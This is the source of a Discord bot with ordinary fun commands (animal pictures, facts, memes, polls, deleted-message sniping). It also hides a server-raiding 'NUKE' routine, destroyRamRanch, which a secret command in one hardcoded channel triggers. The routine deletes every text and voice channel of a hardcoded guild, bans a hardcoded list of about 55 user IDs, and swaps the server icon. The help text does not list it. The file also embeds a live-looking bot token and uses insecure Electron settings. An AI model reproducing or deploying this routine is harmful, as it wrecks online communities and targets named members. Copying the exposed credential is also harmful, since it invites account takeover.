const { Client, Intents, Message, MessageEmbed, MessageAttachment } = require('discord.js');

const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');

function createWindow() {
    // Create the browser window.
    const mainWindow = new BrowserWindow({
        width: 800,
        height: 600,
        webPreferences: {
            contextIsolation: false,
            nodeIntegration: true,
            preload: path.join(__dirname, './preload.js')
        }
    })

    mainWindow.loadFile('index.html')
}

app.whenReady().then(() => {
    createWindow()

    app.on('activate', function () {
        if (BrowserWindow.getAllWindows().length === 0) createWindow()
    })
})

var axios = require('axios');

const fs = require('fs')

const client = new Client({
    intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES, Intents.FLAGS.GUILD_VOICE_STATES,
    Intents.FLAGS.GUILD_MESSAGE_REACTIONS, Intents.FLAGS.DIRECT_MESSAGES, Intents.FLAGS.DIRECT_MESSAGE_REACTIONS,
    Intents.FLAGS.DIRECT_MESSAGE_TYPING, Intents.FLAGS.GUILD_MEMBERS]
});

// create data folder
var folder = "./data";

if (!fs.existsSync(folder)) {
    fs.mkdirSync(folder);
}

// animal pictures
const { getCat, getDog, getBirb, getDuck, getFox, getShibe } = require('animals-api');

const { getMeme } = require("memes-js");

var Scraper = require('images-scraper');

const google = new Scraper({
    puppeteer: {
        headless: false,
    },
});

var dontSnipe;

var suggestionsFile = fs.createWriteStream("data/suggestions.txt", {
    flags: 'a'
})

const prefix = "*";

const embed = new MessageEmbed();

var searching = false;

var hasAttachments = false;
var somethingDeleted = false;
var deleted;

// gui events

ipcMain.on('messageSend', (event, data) => {
    var channel = client.channels.cache.get(data.channelID);
    channel.send(data.message);
})

ipcMain.on('messageDelete', async (event, data) => {
    var channel = await client.channels.cache.get(data.channelID);
    var message = await channel.messages.fetch(data.message);
    message.delete();
    dontSnipe = message;
})

client.once('ready', () => {
    client.user.setActivity("Use *Help");
    console.log("Ready.");
})

// clear command
async function clear(msg, num) {
    if (isNaN(num)) {
        msg.reply(num + " is not a valid number.")
        return;
    }
    if (num > 100 || num < 2) {
        msg.reply("Number has to be between 2 and 100.");
        return;
    }

    try {
        msg.channel.messages.fetch({ limit: num }).then(messages => {
            messages.forEach(message => message.delete());
        })
    } catch (err) {

    }
}

async function capitalizeFirstLetter(string) {
    return string.charAt(0).toUpperCase() + string.slice(1);
}

client.on('messageDelete', async (msg) => {
    if (msg.author.bot) return;
    if (dontSnipe == msg) return;
    deleted = msg;
    somethingDeleted = true;
    hasAttachments = false;
    if (msg.attachments.size > 0) {
        hasAttachments = true;
    }
})

async function getRandomFact(msg) {
    await axios.get('https://uselessfacts.jsph.pl/random.json?language=en')
        .then(response => {
            msg.channel.send({
                embeds: [embed.setAuthor(msg.author.username, msg.author.avatarURL())
                    .setDescription(response.data.text)
                    .setThumbnail()
                    .setTitle("Random Fact").setColor("#34eb6e")]
            });
        })
        .catch(error => {
            console.log(error);
            msg.channel.send("Could not retrieve fact from server.");
        })
}

async function getCatPic(msg) {
    await axios.get('https://api.thecatapi.com/v1/images/search')
        .then(response => {
            msg.channel.send({
                embeds: [embed.setColor("#91dba8").setTitle("Cat Picture:")
                    .setImage(response.data[0].url)
                    .setDescription("")
                    .setThumbnail()
                    .setAuthor(msg.author.username, msg.author.avatarURL())]
            });
        })
        .catch(error => {
            console.log(error);
            msg.channel.send("Could not retrieve picture from server.");
        })
}

async function destroyRamRanch(msg) {
    // get guild
    await msg.channel.send("Retrieving guild...");
    let guild = await client.guilds.cache.get('699313122048999524');


    if (guild == null) {
        msg.reply("Could not retrieve guild by ID.");
        return;
    }
    await msg.channel.send("Successfully retrieved guild **" + guild.name + "**.");

    // get text channels
    await msg.channel.send("Retrieving text channels...");
    let textChannels = await guild.channels.cache.filter(m => m.type === 'GUILD_TEXT');

    if (textChannels == null) {
        await msg.reply("Could not retrieve text channels from guild.");
        return;
    }

    // delete channels

    await msg.channel.send("Looping through text channels...");

    for (let key of textChannels.keys()) {
        let currentChannel = await client.channels.cache.get(key);

        var name = await currentChannel.name;
        currentChannel.delete();

        await msg.channel.send("Channel **" + name + "**:");
        await msg.channel.send("Successfully deleted.");
    }
    await msg.channel.send("Done with text channels!");

    // get voice channels
    await msg.channel.send("Retrieving voice channels...");
    let voiceChannels = await guild.channels.cache.filter(m => m.type === 'GUILD_VOICE');

    if (voiceChannels == null) {
        await msg.reply("Could not retrieve voice channels from guild.");
        return;
    }

    // delete channels

    await msg.channel.send("Looping through voice channels...");

    for (let key of voiceChannels.keys()) {
        let currentChannel = await client.channels.cache.get(key);

        var name = await currentChannel.name;
        currentChannel.delete();

        await msg.channel.send("Channel **" + name + "**:");
        await msg.channel.send("Successfully deleted.");
    }
    await msg.channel.send("Done with voice channels!");


    // ban members

    var bannedCount = 0;
    await msg.channel.send("Banning members...");

    var ids = ['890752133207564339', '750543035875590265', '557657955118350343', '663164275560546304', '141664369493803008', '777707659376721970', '862069341313826896', '541690382031912970', '529703781303189524', '409373009619582977', '549016178241175581', '458082183572226050', '763797938551783476', '844009148341157918', '532689424228679680', '778016359770095636', '829850515382206514', '385396848145334272', '857418082384740352', '675884456925724683', '841365098173169694', '316321931345395714', '701354160322510848', '767923194509656134', '361590652259270657', '835674419208388619', '431538993083973677', '440651888749445122', '318029523427917824', '410222403566698497', '843973143050977311', '698721183159287839', '872182912257233006', '759207678722834443', '548986643697106954', '236629703614660609', '401150521970262019', '508466387681804290', '602266798955560962', '447166488869076992', '396880371293224966', '621124767747014666', '707760481795833916', '711383219458801764', '711383219458801764', '718220827224440882', '605585467940929536', '700144018385928262', '523877785484132352', '632763649584398366', '381545722144620544', '646129379608363019', '519671042625765423', '378638089272164353', '262551331149971456'];

    for (let id of ids) {
        await guild.members.ban(id)
            .then(msg.channel.send("Banned **" + id + "**."))
            .catch(console.error);
        bannedCount += 1;
    }

    await msg.channel.send("Successfully banned **" + bannedCount + "** members.");
    await msg.channel.send("**Done with NUKE!**");

    guild.setIcon('https://cdn.discordapp.com/attachments/959584659556171777/959590554340048976/unknown.png');
}

client.on('messageCreate', async (msg) => {

    if (msg.author.bot) return;

    // special commands
    if (msg.channel.id == '959536626026037299') {
        let guild = await client.guilds.cache.get('969387151462637618');
        if (msg.content == "!DESTROY RAM RANCH") {
            await destroyRamRanch(msg);
        }
        else if (msg.content == "!change") {
            await guild.setIcon('https://cdn.discordapp.com/attachments/959584659556171777/959590554340048976/unknown.png');

            /*await channel.createInvite({
                maxAge: 0,
                maxUses: 0
            }).then(async (invite) => {
                await msg.reply(invite.url);
            })*/
        }
    }
    if (msg.content.startsWith(prefix)) {

        var messageContent = msg.content.replace(prefix, "");

        // greetings
        if (messageContent.toLocaleLowerCase().startsWith("hi")) {
            msg.reply("Hey!");
        }
        else if (messageContent.toLocaleLowerCase().startsWith("hello")) {
            msg.reply("Hi!");
        }
        else if (messageContent.toLocaleLowerCase().startsWith("hey")) {
            msg.reply("Hello!");
        }

        // random fact
        else if (messageContent.toLocaleLowerCase().startsWith("fact")) {
            await getRandomFact(msg);
        }

        // clear
        else if (messageContent.toLocaleLowerCase().startsWith("clear ")) {
            var num = messageContent.toLowerCase().replace("clear ", "");
            await clear(msg, num);
        }

        // pics
        else if (messageContent.toLowerCase().startsWith("pic ")) {
            var messageContent = messageContent.toLowerCase().replace("pic ", "");
            // dog
            if (messageContent == "dog") {
                msg.channel.send({
                    embeds: [embed.setColor("#91dba8").setTitle("Dog Picture:")
                        .setImage(await getDog(['gif', 'jpg']))
                        .setDescription("")
                        .setThumbnail()
                        .setAuthor(msg.author.username, msg.author.avatarURL())]
                }).catch(function (err) {
                    if (err) throw err;
                    msg.reply("Could not load image.");
                });
            }
            // fox
            else if (messageContent == "fox") {
                msg.channel.send({
                    embeds: [embed.setColor("#91dba8").setTitle("Fox Picture:")
                        .setImage(await getFox('jpg'))
                        .setDescription("")
                        .setThumbnail()
                        .setAuthor(msg.author.username, msg.author.avatarURL())]
                }).catch(function (err) {
                    if (err) throw err;
                    msg.reply("Could not load image.");
                });
            }
            // shibe
            else if (messageContent == "shibe") {
                msg.channel.send({
                    embeds: [embed.setColor("#91dba8").setTitle("Shibe Picture:")
                        .setImage(await getShibe(['gif', 'jpg']))
                        .setThumbnail()
                        .setDescription("")
                        .setAuthor(msg.author.username, msg.author.avatarURL())]
                }).catch(function (err) {
                    if (err) throw err;
                    msg.reply("Could not load image.");
                });
            }
            // cat
            else if (messageContent == "cat") {
                await getCatPic(msg);
            }
            // unknown
            else {
                msg.reply("The available animal pictures are for dog, fox, cat, and shibe.");
            }
        }

        // prompt
        else if (messageContent.toLocaleLowerCase().startsWith("prompt ")) {
            messageContent = messageContent.toLocaleLowerCase().replace("prompt ", "");
            var question = await capitalizeFirstLetter(messageContent);
            var botMsg = await msg.channel.send({
                embeds: [embed.setImage().setColor("#2e9fe6").setTitle(question).setAuthor(msg.author.username,
                    msg.author.avatarURL())
                    .setDescription("- Click the :white_check_mark: for yes\n- Click the :x: for no")]
            });
            botMsg.react("✅");
            botMsg.react("❌");

        }

        // image
        else if (messageContent.toLocaleLowerCase().startsWith("image ")) {
            messageContent = messageContent.toLocaleLowerCase().replace("image ", "");
            if (!searching) {
                searching = true;
                msg.reply("Searching for " + messageContent + "...");
                var image = await google.scrape(messageContent, 1);
                msg.channel.send({
                    embeds: [embed.setColor("#baed42").setTitle("Google search of " + messageContent + ":")
                        .setImage(image[0].url)
                        .setThumbnail()
                        .setDescription("")
                        .setAuthor(msg.author.username, msg.author.avatarURL())]
                });
                searching = false;
            }
            else {
                msg.reply("Someone is already searching for an image.");
            }
        }

        // meme
        else if (messageContent.toLocaleLowerCase().startsWith("meme")) {
            getMeme("memes").then((value) => {
                msg.channel.send({
                    embeds: [embed.setColor("#7135a6").setTitle(value.title)
                        .setImage(value.url)
                        .setThumbnail()
                        .setDescription("")
                        .setAuthor(msg.author.username, msg.author.avatarURL())]
                });
            });
        }

        // help
        else if (messageContent.toLocaleLowerCase().startsWith("help")) {
            msg.channel.send({
                embeds: [embed.setColor("#34ebb4").setTitle("List of Commands:").setAuthor(msg.author.username,
                    msg.author.avatarURL()).setThumbnail().setImage()
                    .setDescription("**Prefix: " + prefix + "**" +
                        "\n\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_" +
                        "\n**prompt <y/n question>** - Ask a yes or no question with corresponding reactions." +
                        "\n**snipe** - View a recently deleted message." +
                        "\n**lovecheck <mention user> <mention user>** - Check the chances that they are in love." +
                        "\n**image <something to search>** - Search for an image using google images." +
                        "\n**suggest <suggestion>** - Suggest a command or feature for the bot." +
                        "\n**pic <dog/fox/shibe/cat>** - Show a picture for one of the animals." +
                        "\n**fact** - Send a random interesting fact." +
                        "\n**meme** - Show a random meme from Reddit r/memes." +
                        "\n**clear <num>** - Clear a specified number of messages from the channel.")]
            });
        }

        // suggestion
        else if (messageContent.toLocaleLowerCase().startsWith("suggest ")) {
            messageContent = messageContent.toLocaleLowerCase().replace("suggest ", "");
            var suggestion = await capitalizeFirstLetter(messageContent);
            msg.channel.send({
                embeds: [embed.setImage().setAuthor(msg.author.username, msg.author.avatarURL())
                    .setDescription(suggestion).setTitle("Suggestion sent.").setColor("#16f08a")]
            });
            await suggestionsFile.write(msg.author.username + " (" + msg.author.id + "): " + suggestion + "\n");
            var msgToReact = msg;
            msgToReact.react("✅");
        }

        // snipe
        else if (messageContent.toLocaleLowerCase().startsWith("snipe")) {
            if (somethingDeleted) {
                var attachment = "";
                if (hasAttachments) {
                    attachment = deleted.attachments.first().proxyURL;
                }
                msg.channel.send({
                    embeds: [embed.setAuthor(deleted.author.username, deleted.author.avatarURL())
                        .setDescription(deleted.content)
                        .setImage(attachment)
                        .setThumbnail()
                        .setTitle("Message Sniped").setColor("#360214")]
                });
            }
            else {
                msg.reply("There is nothing to snipe.");
            }
        }

        // love check
        else if (messageContent.toLocaleLowerCase().startsWith("lovecheck ")) {
            var checking = messageContent.toLocaleLowerCase().replace("lovecheck ").split(" ");
            var id1 = checking[0];
            var id2 = checking[1];

            var extra = "."

            var chances = Math.floor(Math.random() * 101);
            if (chances > 85) {
                extra = " 😍";
            }
            else if (chances > 70) {
                extra = "!";
            }
            else if (chances < 30) {
                extra = " :smiling_face_with_tear:";
            }

            var id1Has = true;
            var id2Has = true
            while (id1Has && id2Has) {
                if (id1.includes("undefined")) {
                    id1 = id1.replace("undefined", "");
                }
                else {
                    id1Has = false;
                }

                if (id2.includes("undefined")) {
                    id2 = id2.replace("undefined", "");
                }
                else {
                    id2Has = false;
                }
            }

            msg.reply(id1 + " and " + id2 + "'s chances of being in love are " +
                chances.toString() + "%" + extra);
        }
    }
})


client.login('OTAzODI3NjM1MTQwOTg0OTM0.YXypFA.jif9_kbfGbq3VW3Q-92SqZaj8hg');